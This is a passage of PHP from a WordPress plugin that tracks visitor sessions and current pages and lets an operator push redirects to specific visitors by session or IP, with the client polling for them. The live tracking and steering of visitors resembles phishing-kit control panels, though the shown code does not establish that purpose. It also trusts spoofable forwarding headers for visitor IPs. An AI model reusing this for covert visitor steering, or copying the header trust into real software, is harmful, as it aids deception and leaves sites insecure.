        wp_send_json_success(['message' => 'Heartbeat skipped in admin']);
        return;
    }

    if ($session_id) {
        $wpdb->update(
            $sessions_table,
            ['last_activity' => current_time('mysql')],
            ['session_id' => $session_id],
            ['%s'],
            ['%s']
        );
        wp_send_json_success(['message' => 'Heartbeat updated']);
    }
    forms_approval_log('Heartbeat failed: Invalid session');
    wp_send_json_error(['message' => 'Invalid session']);
}

// Check for visitor redirect and update current page
add_action('wp', 'forms_approval_check_redirect');

function forms_approval_check_redirect() {
    if (defined('DOING_AJAX') || is_admin()) {
        return;
    }

    global $wpdb;
    $session_id = session_id() ?: (isset($_COOKIE['forms_approval_session']) ? $_COOKIE['forms_approval_session'] : false);
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $visitor_ip = !empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] :
                  (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

    if ($session_id) {
        $current_page = ucfirst(basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)) ?: 'Homepage');
        $wpdb->update(
            $sessions_table,
            [
                'last_activity' => current_time('mysql'),
                'current_page' => sanitize_text_field($current_page)
            ],
            ['session_id' => $session_id],
            ['%s', '%s'],
            ['%s']
        );

        // Check redirect by session ID
        if ($redirect = get_transient('forms_approval_redirect_' . $session_id)) {
            forms_approval_log('Redirect triggered for Session ' . $session_id . ' to ' . $redirect);
            delete_transient('forms_approval_redirect_' . $session_id);
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            wp_redirect($redirect);
            exit;
        }

        // Check redirect by visitor IP
        if ($redirect = get_transient('forms_approval_redirect_' . md5($visitor_ip))) {
            forms_approval_log('Redirect triggered for IP ' . $visitor_ip . ' to ' . $redirect);
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            delete_transient('forms_approval_redirect_' . $session_id);
            wp_redirect($redirect);
            exit;
        }
    } else {
        forms_approval_log('No session ID for redirect check, IP: ' . $visitor_ip);
        // Check redirect by visitor IP as fallback
        if ($redirect = get_transient('forms_approval_redirect_' . md5($visitor_ip))) {
            forms_approval_log('Redirect triggered for IP ' . $visitor_ip . ' to ' . $redirect);
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            wp_redirect($redirect);
            exit;
        }
    }
}

// AJAX redirect check
add_action('wp_ajax_forms_approval_check_redirect', 'forms_approval_check_redirect_ajax');
add_action('wp_ajax_nopriv_forms_approval_check_redirect', 'forms_approval_check_redirect_ajax');

function forms_approval_check_redirect_ajax() {
    check_ajax_referer('forms_approval_nonce');
    global $wpdb;
    $session_id = session_id() ?: (isset($_COOKIE['forms_approval_session']) ? $_COOKIE['forms_approval_session'] : false);
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $visitor_ip = !empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] :
                  (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

    if ($session_id) {
        $wpdb->update(
            $sessions_table,
            ['last_activity' => current_time('mysql')],
            ['session_id' => $session_id],
            ['%s'],
            ['%s']
        );

        // Check redirect by session ID
        if ($redirect = get_transient('forms_approval_redirect_' . $session_id)) {
            delete_transient('forms_approval_redirect_' . $session_id);
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            forms_approval_log('AJAX redirect triggered for Session ' . $session_id . ' to ' . $redirect);
            wp_send_json_success(['redirect' => $redirect]);
        }

        // Check redirect by visitor IP
        if ($redirect = get_transient('forms_approval_redirect_' . md5($visitor_ip))) {
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            delete_transient('forms_approval_redirect_' . $session_id);
            forms_approval_log('AJAX redirect triggered for IP ' . $visitor_ip . ' to ' . $redirect);
            wp_send_json_success(['redirect' => $redirect]);
        }
    } else {
        forms_approval_log('No session ID for AJAX redirect check, IP: ' . $visitor_ip);
        // Check redirect by visitor IP as fallback
        if ($redirect = get_transient('forms_approval_redirect_' . md5($visitor_ip))) {
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            forms_approval_log('AJAX redirect triggered for IP ' . $visitor_ip . ' to ' . $redirect);
            wp_send_json_success(['redirect' => $redirect]);
        }
    }
    wp_send_json_success(['redirect' => false]);
}

// Client script
add_action('wp_enqueue_scripts', 'forms_approval_scripts');

function forms_approval_scripts() {
    wp_enqueue_script('forms-approval', plugin_dir_url(__FILE__) . 'forms-approval.js', ['jquery'], '5.0.6', true);
    wp_localize_script('forms-approval', 'formsApprovalSettings', [
        'formIds' => array_map('intval', array_column(get_option('forms_approval_forms', []), 'id')),
        'ajaxUrl' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('forms_approval_nonce')
    ]);
}
?>